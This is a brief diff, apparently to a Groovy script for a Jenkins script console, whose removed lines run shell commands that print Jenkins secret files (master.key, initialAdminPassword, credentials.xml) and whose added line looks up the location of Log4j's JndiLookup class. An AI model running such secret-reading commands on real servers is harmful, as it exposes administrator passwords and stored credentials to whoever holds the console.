@@ -1,3 +1,1 @@
-println('cat /var/lib/jenkins/secrets/master.key'.execute().text);
-println('cat /var/lib/jenkins/secrets/initialAdminPassword'.execute().text);
-println('cat /var/lib/jenkins/credentials.xml'.execute().text);
+org.apache.logging.log4j.core.lookup.JndiLookup.class.protectionDomain.codeSource
